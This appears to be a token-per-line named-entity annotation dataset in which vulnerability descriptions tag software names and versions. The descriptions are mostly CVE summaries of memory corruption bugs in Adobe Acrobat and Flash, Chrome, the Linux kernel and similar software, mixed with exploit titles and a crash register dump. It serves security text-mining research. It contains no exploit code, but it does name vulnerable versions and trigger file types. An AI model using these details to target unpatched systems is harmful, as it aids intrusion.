BASE_ARRAY_STORAGE_VECTOR_LEN O
) O
of O
memory O
without O
caring O
about O
|initialLength| O
. O

So O
a O
BOF O
occurs O
in O
the O
following O
iteration O
. O

So O
the O
next O
routine O
must O
clear O
its O
all O
indices O
. O

But O
the O
routine O
skips O
holes O
in O
|thisObj| O
. O

WebKit O
JSC O
- O
arrayProtoFuncSplice O
does O
not O
Initialize O
all O
Indices O

The O
issue O
involves O
the O
Speech O
Framework O
component O
. O

A O
boundary O
error O
within O
the O
parse_tiff_ifd O
( O
) O
function O
( O
internal/dcraw_common.cpp O
) O
in O
LibRaw SN
versions O
before SV
0.18.2 SV
can O
be O
exploited O
to O
cause O
a O
memory O
corruption O
via O
e.g O
. O

a O
specially O
crafted O
KDC O
file O
with O
model O
set O
to O
DSLR-A100 O
and O
containing O
multiple O
sequences O
of O
0x100 O
and O
0x14A O
TAGs O
. O

The O
parse_string_node O
function O
in O
bplist.c O
in O
libimobiledevice O
libplist SN
1.12 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
plist O
file O
. O

GOM SN
Player SN
2.3.10.5266 SV
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
via O
a O
crafted O
fpx O
file O
. O

Exploit O
Title O
: O
GOM SN
Player SN
2.3.10.5266 SV
- O
Remote O
heap O
corruption O
( O
.fpx O
) O
Date O
: O
2017-02-15 O
Exploit O
Author O
: O
Peter O
Baris O
Exploit O
link O
: O
Software O
Link O
: O
CVE O
: O
CVE-2017-5881 O
Version O
: O
2.3.10.5266 O

eax=092fcde8 O
ebx=00000000 O
ecx=41414141 O
edx=090ff798 O
esi=090ff790 O
edi=05b10000 O
eip=77902fe5 O
esp=10a9fbb4 O
ebp=10a9fc94 O
iopl=0 O
nv O
up O
ei O
ng O
nz O
na O
pe O
cy O
cs=0023 O
ss=002b O
ds=002b O
es=002b O
fs=0053 O
gs=002b O
efl=00010287 O
ntdll O
! O
RtlpFreeHeap+0x4d6 O
: O
77902fe5 O
8b19 O
mov O
ebx O
, O
dword O
ptr O
[ O
ecx O
] O
ds:002b:41414141 O

GOM SN
Player SN
2.3.10.5266 SV
- O
.fpx O
Denial O
of O
Service O

drivers/net/ieee802154/atusb.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
before SV
4.9.6 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

[ O
] O
Not O
to O
mention O
the O
bugs O
introduced O
via O
fixes O
for O
VMAP_STACK O
: O
Use O
CVE-2017-5549 O
. O

) O
: O
Use O
CVE-2017-5550 O
. O

[ O
] O
Use O
CVE-2016-10154 O
. O

since O
VMAP_STACK O
was O
introduced O
haphazardly O
in O
4.9 O
without O
doing O
any O
static O
analysis O
beyond O
a O
simple O
grep O
or O
smatch O
it O
seems O
, O
there O
are O
probably O
a O
dozen O
or O
so O
DoSes O
when O
CONFIG_DEBUG_SG O
or O
CONFIG_DEBUG_VIRTUAL O
is O
enabled O
, O
or O
potential O
silent O
or O
not O
so O
silent O
memory O
corruption O
when O
it O
not O
, O
as O
a O
scatterlist O
crossing O
a O
virtual O
page O
boundary O
will O
then O
end O
up O
accessing O
a O
totally O
unrelated O
adjacent O
physical O
page O
if O
a O
stack O
address O
was O
passed O
into O
the O
scatterlist O
, O
and O
these O
vulnerabilities O
will O
continue O
to O
pop O
up O
until O
something O
comprehensive O
is O
done O
to O
prevent O
them O
. O

[ O
] O
Or O
this O
( O
sgid O
bit O
not O
cleared O
on O
tmpfs O
) O
: O
Use O
CVE-2017-5551 O
. O

[ O
] O
Use O
CVE-2016-10153 O
. O

[ O
] O
0day O
alert O
, O
not O
fixed O
in O
4.9 SV
yet O
: O
Use O
CVE-2017-5548 O
. O

[ O
] O
Or O
how O
about O
a O
CVE O
for O
this O
huge O
heap O
infoleak O
( O
and O
while O
I O
m O
at O
it O
, O
congrats O
to O
Al O
for O
not O
covering O
it O
up O
for O
once O
, O
maybe O
he O
learning O
! O

Emese O
written O
an O
IPA O
GCC O
plugin O
to O
find O
all O
the O
ones O
you O
ve O
missed O
, O
so O
we O
know O
there O
still O
are O
many O
that O
haven O
t O
been O
fixed O
. O

[ O
] O
Use O
CVE-2017-5547 O
. O

Subject O
: O
Re O
: O
CVE O
REQUEST O
: O
linux O
kernel O
: O
process O
with O
pgid O
zero O
able O
to O
crash O
kernel O

drivers/hid/hid-corsair.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
before SV
4.9.6 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

Integer O
overflow O
in O
the O
wrestool O
program O
in O
icoutils SN
before SV
0.31.1 SV
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
executable O
, O
which O
triggers O
a O
denial O
of O
service O
( O
application O
crash O
) O
or O
the O
possibility O
of O
execution O
of O
arbitrary O
code O
. O

Subject O
: O
Re O
: O
CVE O
Request O
: O
icoutils O
: O
exploitable O
crash O
in O
wrestool O
programm O

Inappropriate O
use O
of O
partition O
alloc O
in O
PDFium O
in O
Google SN
Chrome SN
prior SV
to SV
61.0.3163.79 SV
for O
Linux O
, O
Windows O
, O
and O
Mac O
, O
and O
61.0.3163.81 SV
for O
Android O
, O
allowed O
a O
remote O
attacker O
to O
potentially O
exploit O
memory O
corruption O
via O
a O
crafted O
PDF O
file O
. O

An O
incorrect O
assumption O
about O
block O
structure O
in O
Blink O
in O
Google SN
Chrome SN
prior SV
to SV
57.0.2987.133 SV
for O
Mac O
, O
Windows O
, O
and O
Linux O
, O
and O
57.0.2987.132 SV
for O
Android O
, O
allowed O
a O
remote O
attacker O
to O
potentially O
exploit O
memory O
corruption O
via O
a O
crafted O
HTML O
page O
that O
triggers O
improper O
casting O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
drawing O
position O
definition O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
Bezier O
curves O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
parser O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
MakeAccessible O
plugin O
when O
parsing O
TrueType O
font O
data O
. O

Adobe SN
Flash SN
Player SN
versions O
26.0.0.131 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
Action O
Script O
2 O
BitmapData O
class O
. O

Successful O
exploitation O
could O
lead O
to O
memory O
address O
disclosure O
. O

Adobe SN
Flash SN
Player SN
versions O
26.0.0.131 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
Action SN
Script SN
3 SV
raster O
data O
model O
. O

Adobe SN
Digital SN
Editions SN
versions O
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
character O
code O
mapping O
module O
. O

Adobe SN
Digital SN
Editions SN
versions O
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
PDF O
parsing O
engine O
. O

Adobe SN
Digital SN
Editions SN
versions O
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
PDF O
processing O
engine O
. O

Adobe SN
Digital SN
Editions SN
versions O
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
bitmap O
representation O
module O
. O

Adobe SN
Digital SN
Editions SN
4.5.4 SV
and SV
earlier SV
versions SV
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
. O

Adobe SN
Digital SN
Editions SN
versions O
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
PDF O
imaging O
model O
. O

Adobe SN
Digital SN
Editions SN
versions O
4.5.4 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
PDF O
runtime O
engine O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.171 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
LocaleID O
class O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.171 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
internal O
representation O
of O
raster O
data O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.171 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Adobe O
Texture O
Format O
( O
ATF O
) O
module O
. O

Adobe O
Flash O
- O
ATF O
Parser O
Heap O
Corruption O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.171 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
PNG O
image O
parser O
. O

Adobe O
Flash O
- O
Image O
Decoding O
Out-of-Bounds O
Read O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.148 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Graphics O
class O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.148 SV
and SV
earlier SV
have O
an O
exploitable O
use O
after O
free O
vulnerability O
when O
handling O
multiple O
mask O
properties O
of O
display O
objects O
, O
aka O
memory O
corruption O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.148 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
BitmapData O
class O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.148 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
ConvolutionFilter O
class O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.148 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
BlendMode O
class O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.148 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Advanced O
Video O
Coding O
engine O
. O

Adobe O
Flash O
- O
AVC O
Deblocking O
Out-of-Bounds O
Read O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
font O
manipulation O
functionality O
. O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.127 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
parsing O
a O
shape O
outline O
. O

Source O
: O
attached O
swf O
causes O
an O
out-of-bounds O
read O
in O
getting O
the O
width O
of O
a O
TextField O
. O

Adobe O
Flash O
- O
Out-of-Bounds O
Read O
in O
Getting O
TextField O
Width O

Adobe SN
Flash SN
Player SN
versions O
25.0.0.127 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
SWF O
parser O
. O

Adobe O
Flash O
- O
Margin O
Handling O
Heap O
Corruption O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
JavaScript O
engine O
, O
related O
to O
string O
manipulation O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
, O
related O
to O
manipulation O
of O
EMF O
files O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
, O
related O
to O
parsing O
of O
JPEG O
files O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
, O
related O
to O
parsing O
of O
GIF O
files O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JPEG O
2000 O
engine O
, O
related O
to O
image O
scaling O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
parsing O
font O
data O
in O
MakeAccessible O
plugin O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JBIG2 O
image O
compression O
module O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
PPKLite O
security O
handler O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
parsing O
TTF O
( O
TrueType O
font O
format O
) O
stream O
data O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JavaScript O
engine O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
related O
to O
processing O
of O
the O
PCX O
( O
picture O
exchange O
) O
file O
format O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
AES O
module O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
module O
, O
related O
to O
processing O
of O
TIFF O
files O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
related O
to O
internal O
object O
representation O
manipulation O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
manipulating O
PDF O
annotations O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JPEG O
2000 O
code-stream O
tile O
functionality O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Product O
Representation O
Compact O
( O
PRC O
) O
format O
parser O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
renderer O
functionality O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
handling O
a O
malformed O
PDF O
file O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
11.0.19 SV
and SV
earlier SV
, O
15.006.30280 SV
and SV
earlier SV
, O
15.023.20070 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JBIG2 O
parsing O
functionality O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
rendering O
engine O
. O

Adobe SN
Photoshop SN
versions O
CC SV
2017 SV
( O
18.0.1 SV
) O
and SV
earlier SV
, O
CC SV
2015.5.1 SV
( O
17.0.1 SV
) O
and SV
earlier SV
have O
a O
memory O
corruption O
vulnerability O
when O
parsing O
malicious O
PCX O
files O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.221 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
Primetime O
TVSDK O
functionality O
related O
to O
hosting O
playback O
surface O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.221 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
Primetime O
TVSDK O
API O
functionality O
related O
to O
timeline O
interactions O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.194 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Primetime O
SDK O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.194 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
h264 O
codec O
( O
related O
to O
decompression O
) O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.194 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
h264 O
decompression O
routine O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.194 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
performing O
garbage O
collection O
. O

Adobe O
Flash O
- O
SWF O
Stack O
Corruption O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
related O
to O
JPEG O
parsing O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
XFA O
engine O
related O
to O
a O
form O
structure O
and O
organization O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
, O
related O
to O
TIFF O
file O
parsing O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
, O
related O
to O
handling O
of O
the O
color O
profile O
in O
a O
TIFF O
file O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
, O
related O
to O
parsing O
of O
EXIF O
metadata O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
when O
processing O
a O
TIFF O
image O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
parsing O
crafted O
TIFF O
image O
files O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
processing O
tags O
in O
TIFF O
images O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
processing O
Compact O
Font O
Format O
data O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
processing O
JPEG O
2000 O
files O
. O

Adobe SN
Acrobat SN
Reader SN
versions O
15.020.20042 SV
and SV
earlier SV
, O
15.006.30244 SV
and SV
earlier SV
, O
11.0.18 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
when O
processing O
a O
malformed O
cross-reference O
table O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.186 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
related O
to O
the O
parsing O
of O
SWF O
metadata O
. O

Adobe O
Flash O
- O
Metadata O
Parsing O
Out-of-Bounds O
Read O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.186 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
due O
to O
a O
concurrency O
error O
when O
manipulating O
a O
display O
list O
. O

4 O
) O
POC O
: O

Flash O
Player O
was O
created O
by O
Macromedia O
and O
has O
been O
developed O
and O
distributed O
by O
Adobe O
Systems O
since O
Adobe O
acquired O
Macromedia O
. O

Flash O
Player O
can O
run O
from O
a O
web O
browser O
as O
a O
browser O
plug-in O
or O
on O
supported O
mobile O
devices O
. O

Source O
: O
Application O
: O
Adobe SN
Flash SN
Player SN
Platforms O
: O
Windows O
, O
OSX O
Versions O
: O
24.0.0.186 SV
and O
earlier O
Author O
: O
Francis O
Provencher O
of O
COSIG O
Website O
: O
Twitter O
: O
@ O
COSIG_ O
Date O
: O
January O
10 O
, O
2017 O
CVE-2017-2930 O
COSIG-2016-35 O
1 O
) O
Introduction O
2 O
) O
Report O
Timeline O
3 O
) O
Technical O
details O
4 O
) O
POC O
1 O
) O
Introduction O
Adobe O
Flash O
Player O
( O
labeled O
Shockwave O
Flash O
in O
Internet O
Explorer O
and O
Firefox O
) O
is O
a O
freeware O
software O
for O
using O
content O
created O
on O
the O
Adobe O
Flash O
platform O
, O
including O
viewing O
multimedia O
, O
executing O
rich O
Internet O
applications O
, O
and O
streaming O
video O
and O
audio O
. O

Adobe SN
Flash SN
Player SN
24.0.0.186 SV
- O
ActionGetURL2 O
Out-of-Bounds O
Memory O
Corruption O
( O
1 O
) O

Adobe SN
Flash SN
Player SN
24.0.0.186 SV
- O
ActionGetURL2 O
Out-of-Bounds O
Memory O
Corruption O
( O
2 O
) O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.186 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
related O
to O
setting O
visual O
mode O
effects O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.186 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
related O
to O
processing O
of O
atoms O
in O
MP4 O
files O
. O

Adobe SN
Flash SN
Player SN
versions O
24.0.0.186 SV
and SV
earlier SV
have O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
JPEG O
XR O
codec O
. O

An O
attacker O
needs O
to O
send O
a O
specially O
crafted O
websocket O
packet O
over O
the O
network O
to O
trigger O
this O
vulnerability O
. O

An O
exploitable O
memory O
corruption O
vulnerability O
exists O
in O
the O
Websocket O
protocol O
implementation O
of O
Cesanta SN
Mongoose SN
6.8 SV
. O

A O
specially O
crafted O
websocket O
packet O
can O
cause O
a O
buffer O
to O
be O
allocated O
while O
leaving O
stale O
pointers O
which O
leads O
to O
a O
use-after-free O
vulnerability O
which O
can O
be O
exploited O
to O
achieve O
remote O
code O
execution O
. O

A O
specially O
crafted O
websocket O
packet O
can O
cause O
an O
integer O
overflow O
, O
leading O
to O
a O
heap O
buffer O
overflow O
and O
resulting O
in O
denial O
of O
service O
and O
potential O
remote O
code O
execution O
. O

An O
attacker O
needs O
to O
send O
a O
specially O
crafted O
websocket O
packet O
over O
network O
to O
trigger O
this O
vulnerability O
. O

An O
memory O
corruption O
vulnerability O
exists O
in O
the O
.SVG O
parsing O
functionality O
of O
Computerinsel SN
Photoline SN
20.02 SV
. O

A O
specially O
crafted O
.SVG O
file O
can O
cause O
a O
vulnerability O
resulting O
in O
memory O
corruption O
, O
which O
can O
potentially O
lead O
to O
arbitrary O
code O
execution O
. O

An O
attacker O
can O
send O
a O
specific O
.SVG O
file O
to O
trigger O
this O
vulnerability O
. O

A O
specially O
crafted O
XLS O
file O
can O
cause O
a O
memory O
corruption O
resulting O
in O
remote O
code O
execution O
. O

An O
attacker O
can O
send O
malicious O
XLS O
file O
to O
trigger O
this O
vulnerability O
. O

An O
exploitable O
out-of-bounds O
write O
vulnerability O
exists O
in O
read_MSAT O
function O
of O
libxls SN
1.4 SV
. O

An O
exploitable O
out-of-bounds O
write O
vulnerability O
exists O
in O
xls_mergedCells O
function O
of O
libxls SN
1.4 SV
. O
. O

A O
memory O
corruption O
vulnerability O
exists O
in O
.PSD O
parsing O
functionality O
of O
ACDSee SN
Ultimate SV
10.0.0.292 SV
. O

A O
specially O
crafted O
.PSD O
file O
can O
cause O
an O
out O
of O
bounds O
write O
vulnerability O
resulting O
in O
potential O
code O
execution O
. O

An O
attacker O
can O
send O
a O
specific O
.PSD O
file O
to O
trigger O
this O
vulnerability O
. O

An O
memory O
corruption O
vulnerability O
exists O
in O
.GIF O
parsing O
functionality O
of O
Computerinsel SN
Photoline SN
20.02 SV
. O

A O
specially O
crafted O
.GIF O
file O
can O
cause O
a O
vulnerability O
resulting O
in O
potential O
code O
execution O
. O

An O
attacker O
can O
send O
specific O
.GIF O
file O
to O
trigger O
this O
vulnerability O
. O

An O
attacker O
controlled O
VI O
file O
can O
be O
used O
to O
trigger O
this O
vulnerability O
and O
can O
potentially O
result O
in O
code O
execution O
. O

An O
exploitable O
memory O
corruption O
vulnerability O
exists O
in O
RSRC O
segment O
parsing O
functionality O
of O
LabVIEW SN
2017 SV
, O
LabVIEW SN
2016 SV
, O
LabVIEW SN
2015 SV
, O
and O
LabVIEW SN
2014 SV
. O

A O
specially O
crafted O
Virtual O
Instrument O
( O
VI O
) O
file O
